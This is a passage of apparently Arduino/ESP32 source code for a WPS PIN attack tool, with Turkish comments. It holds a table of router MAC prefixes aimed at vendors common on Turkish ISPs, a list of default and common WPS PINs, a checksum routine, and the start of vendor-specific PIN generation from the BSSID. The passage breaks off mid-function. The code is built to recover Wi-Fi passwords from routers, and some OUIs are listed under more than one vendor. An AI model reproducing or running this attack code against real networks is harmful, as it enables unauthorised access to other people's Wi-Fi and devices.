#include <WiFi.h>
#include <esp_wifi.h>
#include <esp_wps.h>
#include <esp_event.h>
#include "wps_attack.h"
#include "web_interface.h"
#include "definitions.h"

// ─── Dışa açılan değişkenler ──────────────────────────────────────────────────
wps_target_t wps_targets[WPS_MAX_TARGETS];
int          wps_target_count  = 0;
wps_state_t  wps_attack_state  = WPS_IDLE;
int          wps_attempt       = 0;
int          wps_total         = 0;
char         wps_current_pin[9]  = {0};
char         wps_found_pin[9]    = {0};
char         wps_found_ssid[33]  = {0};
char         wps_found_pass[65]  = {0};
char         wps_vendor_name[32] = {0};
uint8_t      wps_current_mac[6]  = {0};
int          wps_lockout_count   = 0;

// ─── İç değişkenler ───────────────────────────────────────────────────────────
static int              wps_tgt_idx          = 0;
static volatile int8_t  wps_evt_result       = 0;   // 0=bekle 1=OK -1=fail
static uint8_t          wps_original_mac[6]  = {0}; // İlk STA MAC (yedek)
static int              wps_consec_fail      = 0;   // Ardışık hızlı başarısız
static unsigned long    wps_lockout_until    = 0;   // Lockout bitiş zamanı (ms)

// ─────────────────────────────────────────────────────────────────────────────
// OUI TABLOSU — Türkiye'de yaygın kullanılan modemler
// Her satır: { b0, b1, b2, vendor_enum }
// ─────────────────────────────────────────────────────────────────────────────
struct oui_entry_t { uint8_t o[3]; wps_vendor_t v; };

static const oui_entry_t OUI_TABLE[] = {
  // ── ZTE (Türk Telekom / TTNET VDSL/ADSL/Fiber) ───────────────────────────
  {{0x00,0x26,0xE9}, VENDOR_ZTE},
  {{0x64,0x13,0x6C}, VENDOR_ZTE},
  {{0x34,0x4B,0x50}, VENDOR_ZTE},
  {{0x48,0x8F,0x5A}, VENDOR_ZTE},
  {{0x98,0x68,0xC3}, VENDOR_ZTE},
  {{0xBC,0x4C,0xC4}, VENDOR_ZTE},
  {{0x2C,0x26,0x17}, VENDOR_ZTE},
  {{0x50,0xED,0x9C}, VENDOR_ZTE},
  {{0xC0,0x25,0xE9}, VENDOR_ZTE},
  {{0x4C,0x09,0xD4}, VENDOR_ZTE},
  {{0x00,0x0A,0xEB}, VENDOR_ZTE},
  {{0x10,0xCB,0xCB}, VENDOR_ZTE},
  {{0xEC,0xB9,0x70}, VENDOR_ZTE},
  {{0xFC,0xF6,0x47}, VENDOR_ZTE},
  {{0xAC,0xC3,0x9B}, VENDOR_ZTE},
  {{0x00,0x1E,0x73}, VENDOR_ZTE},
  {{0x58,0x60,0x09}, VENDOR_ZTE},
  {{0x8C,0x97,0xEA}, VENDOR_ZTE},
  {{0x14,0x35,0x8B}, VENDOR_ZTE},
  {{0x28,0x5F,0xDB}, VENDOR_ZTE},
  {{0x40,0xA3,0xCC}, VENDOR_ZTE},
  {{0x64,0xD9,0x54}, VENDOR_ZTE},
  {{0x74,0xE1,0x82}, VENDOR_ZTE},
  {{0xA4,0x97,0xB1}, VENDOR_ZTE},
  {{0xCC,0xCE,0x1E}, VENDOR_ZTE},
  {{0xE8,0xB4,0xC8}, VENDOR_ZTE},
  {{0xF8,0x3D,0xFF}, VENDOR_ZTE},

  // ── Huawei (TTNET Fiber / HG/ONT/B serisi) ───────────────────────────────
  {{0x00,0x18,0x82}, VENDOR_HUAWEI},
  {{0x00,0x1E,0x10}, VENDOR_HUAWEI},
  {{0x00,0x25,0x9E}, VENDOR_HUAWEI},
  {{0x04,0xBD,0x70}, VENDOR_HUAWEI},
  {{0x08,0x7A,0x4C}, VENDOR_HUAWEI},
  {{0x10,0x47,0x80}, VENDOR_HUAWEI},
  {{0x1C,0x8E,0x5C}, VENDOR_HUAWEI},
  {{0x20,0x08,0xED}, VENDOR_HUAWEI},
  {{0x28,0x31,0x52}, VENDOR_HUAWEI},
  {{0x34,0x6B,0xD3}, VENDOR_HUAWEI},
  {{0x48,0xAD,0x08}, VENDOR_HUAWEI},
  {{0x4C,0x1F,0xCC}, VENDOR_HUAWEI},
  {{0x54,0x51,0x1B}, VENDOR_HUAWEI},
  {{0x58,0x2A,0xF7}, VENDOR_HUAWEI},
  {{0x60,0xDE,0x44}, VENDOR_HUAWEI},
  {{0x68,0xA0,0xF6}, VENDOR_HUAWEI},
  {{0x70,0x72,0xCF}, VENDOR_HUAWEI},
  {{0x74,0xA5,0x28}, VENDOR_HUAWEI},
  {{0x78,0x1D,0xBA}, VENDOR_HUAWEI},
  {{0x7C,0x45,0x2C}, VENDOR_HUAWEI},
  {{0x80,0xFB,0x06}, VENDOR_HUAWEI},
  {{0x84,0xBE,0x52}, VENDOR_HUAWEI},
  {{0x88,0x3F,0xD3}, VENDOR_HUAWEI},
  {{0x8C,0x34,0xFD}, VENDOR_HUAWEI},
  {{0x90,0x17,0xAC}, VENDOR_HUAWEI},
  {{0x94,0x37,0xF7}, VENDOR_HUAWEI},
  {{0x9C,0x37,0xF4}, VENDOR_HUAWEI},
  {{0xA0,0x08,0x6F}, VENDOR_HUAWEI},
  {{0xAC,0xE2,0x15}, VENDOR_HUAWEI},
  {{0xB0,0xE5,0xED}, VENDOR_HUAWEI},
  {{0xB4,0x15,0x13}, VENDOR_HUAWEI},
  {{0xC4,0x06,0x83}, VENDOR_HUAWEI},
  {{0xC8,0x51,0x95}, VENDOR_HUAWEI},
  {{0xCC,0x53,0xB5}, VENDOR_HUAWEI},
  {{0xD0,0x7A,0xB5}, VENDOR_HUAWEI},
  {{0xD4,0x12,0x43}, VENDOR_HUAWEI},
  {{0xD4,0x6E,0x5C}, VENDOR_HUAWEI},
  {{0xE4,0xD3,0x32}, VENDOR_HUAWEI},
  {{0xE8,0xCD,0x2D}, VENDOR_HUAWEI},
  {{0xEC,0x23,0x3D}, VENDOR_HUAWEI},
  {{0xF0,0x7D,0x68}, VENDOR_HUAWEI},
  {{0xF4,0x4C,0x7F}, VENDOR_HUAWEI},
  {{0xF8,0x01,0x13}, VENDOR_HUAWEI},
  {{0xFC,0x48,0xEF}, VENDOR_HUAWEI},
  {{0x24,0xDB,0xAC}, VENDOR_HUAWEI},
  {{0x2C,0xF0,0xA2}, VENDOR_HUAWEI},
  {{0x30,0x45,0x96}, VENDOR_HUAWEI},
  {{0x38,0xF8,0x89}, VENDOR_HUAWEI},
  {{0x40,0x4D,0x7F}, VENDOR_HUAWEI},
  {{0x50,0x68,0x0A}, VENDOR_HUAWEI},

  // ── Zyxel (Superonline / TTNET / Vodafone Net modemler) ──────────────────
  {{0x00,0x13,0x49}, VENDOR_ZYXEL},
  {{0x00,0x19,0xCB}, VENDOR_ZYXEL},
  {{0x00,0x24,0xE8}, VENDOR_ZYXEL},
  {{0x00,0xA0,0xC5}, VENDOR_ZYXEL},
  {{0x1C,0x74,0x0D}, VENDOR_ZYXEL},
  {{0x20,0x76,0x8F}, VENDOR_ZYXEL},
  {{0x28,0x28,0x5D}, VENDOR_ZYXEL},
  {{0x48,0xEE,0x0C}, VENDOR_ZYXEL},
  {{0x58,0x8B,0xF3}, VENDOR_ZYXEL},
  {{0x68,0x73,0x4B}, VENDOR_ZYXEL},
  {{0x70,0x6E,0x6D}, VENDOR_ZYXEL},
  {{0x80,0x04,0x5F}, VENDOR_ZYXEL},
  {{0x88,0x53,0x95}, VENDOR_ZYXEL},
  {{0x90,0x65,0xF9}, VENDOR_ZYXEL},
  {{0xA0,0x18,0x28}, VENDOR_ZYXEL},
  {{0xB4,0x43,0x8A}, VENDOR_ZYXEL},
  {{0xB8,0xEC,0xA3}, VENDOR_ZYXEL},
  {{0xC4,0xAD,0x34}, VENDOR_ZYXEL},
  {{0xC8,0x6C,0x87}, VENDOR_ZYXEL},
  {{0xD0,0x50,0x99}, VENDOR_ZYXEL},
  {{0xD4,0x81,0xD7}, VENDOR_ZYXEL},
  {{0xD8,0xFE,0xE3}, VENDOR_ZYXEL},
  {{0xDC,0x4A,0x3E}, VENDOR_ZYXEL},
  {{0xE4,0xD3,0xF1}, VENDOR_ZYXEL},
  {{0xE8,0x37,0x7A}, VENDOR_ZYXEL},
  {{0xF0,0x94,0xC2}, VENDOR_ZYXEL},
  {{0xFC,0xF5,0x28}, VENDOR_ZYXEL},
  {{0x2C,0xFD,0xA1}, VENDOR_ZYXEL},
  {{0x40,0x4A,0x03}, VENDOR_ZYXEL},
  {{0x5C,0xF4,0xAB}, VENDOR_ZYXEL},

  // ── TP-Link (piyasada en yaygın — her operatör) ───────────────────────────
  {{0x00,0x1D,0x0F}, VENDOR_TPLINK},
  {{0x00,0x23,0xCD}, VENDOR_TPLINK},
  {{0x00,0x27,0x19}, VENDOR_TPLINK},
  {{0x14,0xCF,0x92}, VENDOR_TPLINK},
  {{0x18,0xD6,0xC7}, VENDOR_TPLINK},
  {{0x1C,0xFA,0x68}, VENDOR_TPLINK},
  {{0x50,0xBD,0x5F}, VENDOR_TPLINK},
  {{0x50,0xC7,0xBF}, VENDOR_TPLINK},
  {{0x54,0xE6,0xFC}, VENDOR_TPLINK},
  {{0x60,0xA4,0x4C}, VENDOR_TPLINK},
  {{0x64,0x70,0x02}, VENDOR_TPLINK},
  {{0x70,0x4F,0x57}, VENDOR_TPLINK},
  {{0x74,0xDA,0x38}, VENDOR_TPLINK},
  {{0x8C,0x21,0x0A}, VENDOR_TPLINK},
  {{0x90,0xF6,0x52}, VENDOR_TPLINK},
  {{0x98,0xDA,0xC4}, VENDOR_TPLINK},
  {{0xA0,0xF3,0xC1}, VENDOR_TPLINK},
  {{0xAC,0x84,0xC6}, VENDOR_TPLINK},
  {{0xB0,0x48,0x7A}, VENDOR_TPLINK},
  {{0xC4,0xE9,0x84}, VENDOR_TPLINK},
  {{0xC8,0xD3,0xA3}, VENDOR_TPLINK},
  {{0xCC,0x32,0xE5}, VENDOR_TPLINK},
  {{0xD8,0x0D,0x17}, VENDOR_TPLINK},
  {{0xE8,0xDE,0x27}, VENDOR_TPLINK},
  {{0xEC,0x08,0x6B}, VENDOR_TPLINK},
  {{0xF4,0xEC,0x38}, VENDOR_TPLINK},
  {{0xF8,0x1A,0x67}, VENDOR_TPLINK},
  {{0x28,0x87,0xBA}, VENDOR_TPLINK},
  {{0x30,0xDE,0x4B}, VENDOR_TPLINK},
  {{0x40,0x16,0x9F}, VENDOR_TPLINK},
  {{0x44,0xA5,0x6E}, VENDOR_TPLINK},
  {{0x10,0xBF,0x48}, VENDOR_TPLINK},
  {{0x6C,0x5A,0xB5}, VENDOR_TPLINK},
  {{0xA4,0x2B,0xB0}, VENDOR_TPLINK},

  // ── Sagemcom (TTNET Fiber F@st 3686, F@st 3890, Livebox serisi) ───────────
  // Türkiye'de Türk Telekom tarafından en çok dağıtılan fiber modem!
  {{0x00,0x24,0xD4}, VENDOR_SAGEMCOM},
  {{0x30,0x87,0xD9}, VENDOR_SAGEMCOM},
  {{0x5C,0x49,0x79}, VENDOR_SAGEMCOM},
  {{0x6C,0xAE,0x8B}, VENDOR_SAGEMCOM},
  {{0x78,0x44,0x76}, VENDOR_SAGEMCOM},
  {{0x84,0x9D,0xC7}, VENDOR_SAGEMCOM},
  {{0xAC,0x9E,0x17}, VENDOR_SAGEMCOM},
  {{0xB8,0x75,0x4F}, VENDOR_SAGEMCOM},
  {{0xCC,0xB2,0x55}, VENDOR_SAGEMCOM},
  {{0xD0,0x55,0xDF}, VENDOR_SAGEMCOM},
  {{0xD8,0x61,0x6A}, VENDOR_SAGEMCOM},
  {{0xDC,0xAD,0xE4}, VENDOR_SAGEMCOM},
  {{0xE8,0x12,0x18}, VENDOR_SAGEMCOM},
  {{0xFC,0x59,0xF0}, VENDOR_SAGEMCOM},
  {{0x00,0x1A,0x2A}, VENDOR_SAGEMCOM},
  {{0x14,0x49,0xBC}, VENDOR_SAGEMCOM},
  {{0x18,0x83,0xBF}, VENDOR_SAGEMCOM},
  {{0x28,0xC6,0x8E}, VENDOR_SAGEMCOM},
  {{0x3C,0x81,0xD8}, VENDOR_SAGEMCOM},
  {{0x40,0xB8,0x9A}, VENDOR_SAGEMCOM},
  {{0x50,0x7E,0x5D}, VENDOR_SAGEMCOM},
  {{0x58,0x23,0x8C}, VENDOR_SAGEMCOM},
  {{0x64,0x9E,0xF3}, VENDOR_SAGEMCOM},
  {{0x80,0xB6,0x86}, VENDOR_SAGEMCOM},
  {{0x88,0xD7,0xF6}, VENDOR_SAGEMCOM},
  {{0x90,0x72,0x82}, VENDOR_SAGEMCOM},
  {{0xA8,0x58,0x40}, VENDOR_SAGEMCOM},
  {{0xBC,0xF3,0x12}, VENDOR_SAGEMCOM},

  // ── Arcadyan / Askey (Vodafone Türkiye, Turkcell Superonline OEM) ──────────
  {{0x00,0x90,0xD0}, VENDOR_ARCADYAN},
  {{0x10,0xBF,0x48}, VENDOR_ARCADYAN},
  {{0x14,0xAB,0xC5}, VENDOR_ARCADYAN},
  {{0x20,0x76,0x93}, VENDOR_ARCADYAN},
  {{0x44,0x27,0x07}, VENDOR_ARCADYAN},
  {{0x4C,0x55,0xCC}, VENDOR_ARCADYAN},
  {{0x74,0x31,0x70}, VENDOR_ARCADYAN},
  {{0x98,0x01,0xA7}, VENDOR_ARCADYAN},
  {{0xA4,0x2B,0x8C}, VENDOR_ARCADYAN},
  {{0xB8,0x36,0xB5}, VENDOR_ARCADYAN},
  {{0xD4,0xF5,0x27}, VENDOR_ARCADYAN},
  {{0xE4,0x32,0xCB}, VENDOR_ARCADYAN},
  {{0xFC,0x94,0xE3}, VENDOR_ARCADYAN},
  {{0x00,0x17,0x3F}, VENDOR_ARCADYAN},
  {{0x04,0xED,0x33}, VENDOR_ARCADYAN},
  {{0x0C,0x54,0xA5}, VENDOR_ARCADYAN},
  {{0x18,0xA6,0xF7}, VENDOR_ARCADYAN},
  {{0x2C,0x30,0x33}, VENDOR_ARCADYAN},
  {{0x34,0xC3,0xD2}, VENDOR_ARCADYAN},
  {{0x40,0x4E,0x36}, VENDOR_ARCADYAN},
  {{0x58,0x6D,0x8F}, VENDOR_ARCADYAN},
  {{0x6C,0xB7,0xF4}, VENDOR_ARCADYAN},
  {{0x84,0x39,0xBE}, VENDOR_ARCADYAN},
  {{0x94,0x83,0xC4}, VENDOR_ARCADYAN},
  {{0xA8,0x4E,0x3F}, VENDOR_ARCADYAN},
  {{0xBC,0x05,0x43}, VENDOR_ARCADYAN},
  {{0xCC,0x34,0x29}, VENDOR_ARCADYAN},

  // ── D-Link (tüketici pazarında çok yaygın — DIR, DWR, DSL serisi) ─────────
  {{0x00,0x05,0x5D}, VENDOR_DLINK},
  {{0x00,0x0D,0x88}, VENDOR_DLINK},
  {{0x00,0x11,0x95}, VENDOR_DLINK},
  {{0x00,0x13,0x46}, VENDOR_DLINK},
  {{0x00,0x15,0xE9}, VENDOR_DLINK},
  {{0x00,0x17,0x9A}, VENDOR_DLINK},
  {{0x00,0x19,0x5B}, VENDOR_DLINK},
  {{0x00,0x1B,0x11}, VENDOR_DLINK},
  {{0x00,0x1C,0xF0}, VENDOR_DLINK},
  {{0x00,0x1E,0x58}, VENDOR_DLINK},
  {{0x00,0x21,0x91}, VENDOR_DLINK},
  {{0x00,0x22,0xB0}, VENDOR_DLINK},
  {{0x00,0x24,0x01}, VENDOR_DLINK},
  {{0x00,0x26,0x5A}, VENDOR_DLINK},
  {{0x14,0xD6,0x4D}, VENDOR_DLINK},
  {{0x1C,0x7E,0xE5}, VENDOR_DLINK},
  {{0x28,0x10,0x7B}, VENDOR_DLINK},
  {{0x34,0x08,0x04}, VENDOR_DLINK},
  {{0x50,0x46,0x5D}, VENDOR_DLINK},
  {{0x54,0xB8,0x0A}, VENDOR_DLINK},
  {{0x6C,0x19,0x8F}, VENDOR_DLINK},
  {{0x6C,0x72,0x20}, VENDOR_DLINK},
  {{0x78,0x54,0x2E}, VENDOR_DLINK},
  {{0x84,0xC9,0xB2}, VENDOR_DLINK},
  {{0x90,0x94,0xE4}, VENDOR_DLINK},
  {{0xA0,0xAB,0x1B}, VENDOR_DLINK},
  {{0xB8,0xA3,0x86}, VENDOR_DLINK},
  {{0xBC,0xF6,0x85}, VENDOR_DLINK},
  {{0xC0,0xA0,0xBB}, VENDOR_DLINK},
  {{0xC8,0xBE,0x19}, VENDOR_DLINK},
  {{0xD8,0xEB,0x97}, VENDOR_DLINK},
  {{0xE4,0x6F,0x13}, VENDOR_DLINK},
  {{0xF0,0x7D,0x68}, VENDOR_DLINK},
  {{0x1C,0xBD,0xB9}, VENDOR_DLINK},
  {{0x34,0xA8,0x4E}, VENDOR_DLINK},
  {{0x40,0x3D,0xEC}, VENDOR_DLINK},
  {{0x78,0xD2,0x94}, VENDOR_DLINK},
  {{0xAC,0xF1,0xDF}, VENDOR_DLINK},
  {{0xCC,0xBE,0x59}, VENDOR_DLINK},

  // ── Netgear (tüketici / SOHO pazarı — R, C, D, Nighthawk serisi) ──────────
  {{0x00,0x14,0x6C}, VENDOR_NETGEAR},
  {{0x00,0x18,0x4D}, VENDOR_NETGEAR},
  {{0x00,0x1B,0x2F}, VENDOR_NETGEAR},
  {{0x00,0x1E,0x2A}, VENDOR_NETGEAR},
  {{0x00,0x22,0x3F}, VENDOR_NETGEAR},
  {{0x00,0x24,0xB2}, VENDOR_NETGEAR},
  {{0x00,0x26,0xF2}, VENDOR_NETGEAR},
  {{0x10,0x0D,0x7F}, VENDOR_NETGEAR},
  {{0x10,0xDA,0x43}, VENDOR_NETGEAR},
  {{0x20,0x4E,0x7F}, VENDOR_NETGEAR},
  {{0x28,0x80,0x23}, VENDOR_NETGEAR},
  {{0x2C,0xB0,0x5D}, VENDOR_NETGEAR},
  {{0x30,0x46,0x9A}, VENDOR_NETGEAR},
  {{0x44,0x94,0xFC}, VENDOR_NETGEAR},
  {{0x4C,0x60,0xDE}, VENDOR_NETGEAR},
  {{0x60,0x38,0xE0}, VENDOR_NETGEAR},
  {{0x6C,0xB0,0xCE}, VENDOR_NETGEAR},
  {{0x84,0x1B,0x5E}, VENDOR_NETGEAR},
  {{0xA0,0x21,0xB7}, VENDOR_NETGEAR},
  {{0xA0,0x40,0xA0}, VENDOR_NETGEAR},
  {{0xB0,0x39,0x56}, VENDOR_NETGEAR},
  {{0xC0,0x3F,0x0E}, VENDOR_NETGEAR},
  {{0xC4,0x04,0x15}, VENDOR_NETGEAR},
  {{0xE0,0x46,0x9A}, VENDOR_NETGEAR},
  {{0xE4,0xF4,0xC6}, VENDOR_NETGEAR},
  {{0x6C,0x40,0x08}, VENDOR_NETGEAR},
  {{0x9C,0xD3,0x6D}, VENDOR_NETGEAR},
  {{0xA0,0x04,0x60}, VENDOR_NETGEAR},

  // ── ASUS (Gaming/Ev router — RT-AC, RT-AX, RT-N, GT-AX serisi) ───────────
  {{0x00,0x0C,0x6E}, VENDOR_ASUS},
  {{0x00,0x0E,0xA6}, VENDOR_ASUS},
  {{0x00,0x11,0x2F}, VENDOR_ASUS},
  {{0x00,0x13,0xD4}, VENDOR_ASUS},
  {{0x00,0x15,0xF2}, VENDOR_ASUS},
  {{0x00,0x17,0x31}, VENDOR_ASUS},
  {{0x00,0x18,0xF3}, VENDOR_ASUS},
  {{0x00,0x1A,0x92}, VENDOR_ASUS},
  {{0x00,0x1D,0x60}, VENDOR_ASUS},
  {{0x00,0x1E,0x8C}, VENDOR_ASUS},
  {{0x00,0x1F,0xC6}, VENDOR_ASUS},
  {{0x00,0x22,0x15}, VENDOR_ASUS},
  {{0x00,0x23,0x54}, VENDOR_ASUS},
  {{0x00,0x24,0x8C}, VENDOR_ASUS},
  {{0x00,0x26,0x18}, VENDOR_ASUS},
  {{0x04,0x92,0x26}, VENDOR_ASUS},
  {{0x08,0x60,0x6E}, VENDOR_ASUS},
  {{0x0C,0x9D,0x92}, VENDOR_ASUS},
  {{0x10,0x02,0xB5}, VENDOR_ASUS},
  {{0x14,0xDA,0xE9}, VENDOR_ASUS},
  {{0x18,0x31,0xBF}, VENDOR_ASUS},
  {{0x1C,0x87,0x2C}, VENDOR_ASUS},
  {{0x20,0xCF,0x30}, VENDOR_ASUS},
  {{0x2C,0x56,0xDC}, VENDOR_ASUS},
  {{0x30,0x5A,0x3A}, VENDOR_ASUS},
  {{0x34,0x97,0xF6}, VENDOR_ASUS},
  {{0x38,0x2C,0x4A}, VENDOR_ASUS},
  {{0x40,0x16,0x7E}, VENDOR_ASUS},
  {{0x44,0x8A,0x5B}, VENDOR_ASUS},
  {{0x4C,0xED,0xFB}, VENDOR_ASUS},
  {{0x54,0x04,0xA6}, VENDOR_ASUS},
  {{0x58,0x11,0x22}, VENDOR_ASUS},
  {{0x5C,0xFF,0x35}, VENDOR_ASUS},
  {{0x60,0x45,0xCB}, VENDOR_ASUS},
  {{0x6C,0x62,0x6D}, VENDOR_ASUS},
  {{0x70,0x8B,0xCD}, VENDOR_ASUS},
  {{0x74,0xD0,0x2B}, VENDOR_ASUS},
  {{0x80,0x1F,0x02}, VENDOR_ASUS},
  {{0x84,0xA9,0xC4}, VENDOR_ASUS},
  {{0x8C,0x8D,0x28}, VENDOR_ASUS},
  {{0x90,0xE6,0xBA}, VENDOR_ASUS},
  {{0x94,0xDE,0x80}, VENDOR_ASUS},
  {{0xA8,0x5E,0x45}, VENDOR_ASUS},
  {{0xB0,0x6E,0xBF}, VENDOR_ASUS},
  {{0xBC,0xAE,0xC5}, VENDOR_ASUS},
  {{0xC8,0x60,0x00}, VENDOR_ASUS},
  {{0xD0,0x17,0xC2}, VENDOR_ASUS},
  {{0xD4,0x5D,0xDF}, VENDOR_ASUS},
  {{0xD8,0x50,0xE6}, VENDOR_ASUS},
  {{0xDC,0xFE,0x07}, VENDOR_ASUS},
  {{0xE0,0x3F,0x49}, VENDOR_ASUS},
  {{0xE4,0x70,0xB8}, VENDOR_ASUS},
  {{0xE8,0x9F,0x80}, VENDOR_ASUS},
  {{0xF0,0x79,0x59}, VENDOR_ASUS},
  {{0xF4,0x6D,0x04}, VENDOR_ASUS},
  {{0xF8,0x32,0xE4}, VENDOR_ASUS},
  {{0xFC,0x8B,0x97}, VENDOR_ASUS},
  {{0x24,0x4B,0xFE}, VENDOR_ASUS},
  {{0x2C,0xFD,0xA1}, VENDOR_ASUS},
  {{0x3C,0x7C,0x3F}, VENDOR_ASUS},
  {{0x50,0x46,0x5D}, VENDOR_ASUS},

  // ── Linksys (Ev/SOHO router — WRT, EA, MR, Velop serisi) ─────────────────
  {{0x00,0x06,0x25}, VENDOR_LINKSYS},
  {{0x00,0x0C,0x41}, VENDOR_LINKSYS},
  {{0x00,0x0E,0x08}, VENDOR_LINKSYS},
  {{0x00,0x12,0x17}, VENDOR_LINKSYS},
  {{0x00,0x13,0x10}, VENDOR_LINKSYS},
  {{0x00,0x14,0xBF}, VENDOR_LINKSYS},
  {{0x00,0x16,0xB6}, VENDOR_LINKSYS},
  {{0x00,0x18,0x39}, VENDOR_LINKSYS},
  {{0x00,0x1A,0x70}, VENDOR_LINKSYS},
  {{0x00,0x1C,0x10}, VENDOR_LINKSYS},
  {{0x00,0x1D,0x7E}, VENDOR_LINKSYS},
  {{0x00,0x1E,0xE5}, VENDOR_LINKSYS},
  {{0x00,0x21,0x29}, VENDOR_LINKSYS},
  {{0x00,0x22,0x6B}, VENDOR_LINKSYS},
  {{0x00,0x23,0x69}, VENDOR_LINKSYS},
  {{0x00,0x25,0x9C}, VENDOR_LINKSYS},
  {{0x20,0xAA,0x4B}, VENDOR_LINKSYS},
  {{0x58,0x6D,0x8F}, VENDOR_LINKSYS},
  {{0xC0,0xC1,0xC0}, VENDOR_LINKSYS},
  {{0xC4,0x41,0x1E}, VENDOR_LINKSYS},
  {{0x98,0xFC,0x11}, VENDOR_LINKSYS},
  {{0x48,0xF8,0xB3}, VENDOR_LINKSYS},
  {{0x54,0xBE,0xF7}, VENDOR_LINKSYS},
  {{0x60,0x38,0xE0}, VENDOR_LINKSYS},
  {{0xA0,0x21,0xB7}, VENDOR_LINKSYS},

  // ── Belkin (Bütçe router — F7D, F9K, AC serisi) ───────────────────────────
  {{0x00,0x11,0x50}, VENDOR_BELKIN},
  {{0x00,0x17,0x3F}, VENDOR_BELKIN},
  {{0x00,0x1C,0xDF}, VENDOR_BELKIN},
  {{0x00,0x22,0x75}, VENDOR_BELKIN},
  {{0x00,0x26,0xB9}, VENDOR_BELKIN},
  {{0x08,0x86,0x3B}, VENDOR_BELKIN},
  {{0x14,0x91,0x82}, VENDOR_BELKIN},
  {{0x30,0x23,0x03}, VENDOR_BELKIN},
  {{0x44,0xD9,0xE7}, VENDOR_BELKIN},
  {{0x54,0x4A,0x16}, VENDOR_BELKIN},
  {{0x68,0x7F,0x74}, VENDOR_BELKIN},
  {{0x94,0x44,0x52}, VENDOR_BELKIN},
  {{0xB4,0x75,0x0E}, VENDOR_BELKIN},
  {{0xEC,0x1A,0x59}, VENDOR_BELKIN},
  {{0xA0,0xAB,0x1B}, VENDOR_BELKIN},
  {{0xC4,0x41,0x1E}, VENDOR_BELKIN},
  {{0x20,0xAA,0x4B}, VENDOR_BELKIN},

  // ── Tenda (Bütçe/Orta segment — AC, F, N serisi — TR'de çok satılan) ─────
  {{0x00,0x16,0x44}, VENDOR_TENDA},
  {{0x1C,0xAF,0xF7}, VENDOR_TENDA},
  {{0x2C,0xF0,0xEE}, VENDOR_TENDA},
  {{0x4C,0xD1,0x61}, VENDOR_TENDA},
  {{0x80,0xEA,0x07}, VENDOR_TENDA},
  {{0x88,0x5D,0xFB}, VENDOR_TENDA},
  {{0x90,0x56,0x82}, VENDOR_TENDA},
  {{0xA0,0x40,0xE8}, VENDOR_TENDA},
  {{0xB4,0x0F,0x3B}, VENDOR_TENDA},
  {{0xC8,0x3A,0x35}, VENDOR_TENDA},
  {{0xD4,0x76,0xEA}, VENDOR_TENDA},
  {{0x48,0xEE,0x0C}, VENDOR_TENDA},
  {{0x54,0x36,0x9B}, VENDOR_TENDA},
  {{0x58,0x3B,0xD4}, VENDOR_TENDA},
  {{0x6C,0xAB,0x31}, VENDOR_TENDA},
  {{0x8C,0x53,0xC3}, VENDOR_TENDA},
  {{0xE4,0xBF,0xFA}, VENDOR_TENDA},
  {{0xF4,0x3E,0x61}, VENDOR_TENDA},

  // ── Mercusys (TP-Link alt markası — MW, MR serisi — TR'de çok satılan) ────
  {{0x58,0xEF,0x68}, VENDOR_MERCUSYS},
  {{0x64,0x9A,0xBE}, VENDOR_MERCUSYS},
  {{0x78,0xD2,0x94}, VENDOR_MERCUSYS},
  {{0x90,0xDE,0x80}, VENDOR_MERCUSYS},
  {{0xC4,0x9D,0xED}, VENDOR_MERCUSYS},
  {{0xF8,0xE7,0xB3}, VENDOR_MERCUSYS},
  {{0x24,0x0A,0xC4}, VENDOR_MERCUSYS},
  {{0x44,0xA5,0x6E}, VENDOR_MERCUSYS},
  {{0x6C,0x5A,0xB5}, VENDOR_MERCUSYS},
  {{0xA0,0xAF,0xBD}, VENDOR_MERCUSYS},
  {{0xB4,0xA2,0xEB}, VENDOR_MERCUSYS},
};

static const int OUI_TABLE_SIZE = (int)(sizeof(OUI_TABLE) / sizeof(OUI_TABLE[0]));

// ─────────────────────────────────────────────────────────────────────────────
// ORTAK PIN LİSTESİ — araştırma veritabanı + Türk ISP varsayılanları
// ─────────────────────────────────────────────────────────────────────────────
static const char *COMMON_PINS[] = {
  // WPS standart varsayılanlar
  "12345670", "00000000", "11111111", "22222222", "33333333",
  "44444444", "55555555", "66666666", "77777777", "88888888",
  "99999999", "12345678", "87654321",
  // TTNET / Türk Telekom modem fabrika çıkış
  "20192019", "11223344", "44332211", "10000000", "20000000",
  "30000000", "40000000", "50000000", "60000000", "70000000",
  "80000000", "90000000",
  // Yaygın router varsayılanları
  "01234567", "76543210", "11110000", "00001111", "13131313",
  "31313131", "12121212", "21212121", "10101010", "01010101",
  "11001100", "00110011", "12341234", "43214321", "98765432",
  "23456789", "11223300", "00223311", "11001122", "22110011",
  "12300000", "00000012", "12120000", "00001212", "11220000",
  "00001122", "55550000", "00005555", "12340000", "00001234",
  "99999990", "11111110", "00000001", "10203040", "40302010",
  nullptr
};
static const int COMMON_PIN_COUNT = 59;

// ─── WPS Checksum hesabı ──────────────────────────────────────────────────────
static uint8_t wps_checksum(uint32_t pin7) {
  uint32_t acc = 0;
  uint32_t p   = pin7;
  int digits[7];
  for (int i = 6; i >= 0; i--) { digits[i] = p % 10; p /= 10; }
  acc = 3*digits[0] + digits[1] + 3*digits[2] + digits[3]
      + 3*digits[4] + digits[5] + 3*digits[6];
  return (uint8_t)((10 - (acc % 10)) % 10);
}

static void make_pin(uint32_t pin7, char out[9]) {
  uint8_t cs = wps_checksum(pin7);
  snprintf(out, 9, "%07u%u", pin7, cs);
}

// ─── Sabit PIN (checksum dahil) ekle ─────────────────────────────────────────
// Zaten checksum hesaplanmış PIN'leri direkt ekler (ortak listeden alınanlar)
static inline void add_pin(char pins[][9], int &count, const char *p) {
  if (count >= 32) return;
  strncpy(pins[count++], p, 9);
}

static inline void add_calc(char pins[][9], int &count, uint32_t p7) {
  if (count >= 32) return;
  make_pin(p7, pins[count++]);
}

// ─── OUI eşleştirme ──────────────────────────────────────────────────────────
static wps_vendor_t detect_vendor(const uint8_t *bssid) {
  for (int i = 0; i < OUI_TABLE_SIZE; i++) {
    if (bssid[0] == OUI_TABLE[i].o[0] &&
        bssid[1] == OUI_TABLE[i].o[1] &&
        bssid[2] == OUI_TABLE[i].o[2]) {
      return OUI_TABLE[i].v;
    }
  }
  return VENDOR_UNKNOWN;
}

// ─── Vendor PIN hesaplama ──────────────────────────────────────────────────────
// Her vendor için birden fazla bilinen algoritma uygulanır.
static void vendor_pins(const uint8_t *bssid, wps_vendor_t vendor,
                        char pins[][9], int &count) {
  count = 0;

  uint32_t mac24 = ((uint32_t)bssid[3] << 16)
                 | ((uint32_t)bssid[4] <<  8)
                 |  (uint32_t)bssid[5];

  uint32_t mac32 = ((uint32_t)bssid[2] << 24)
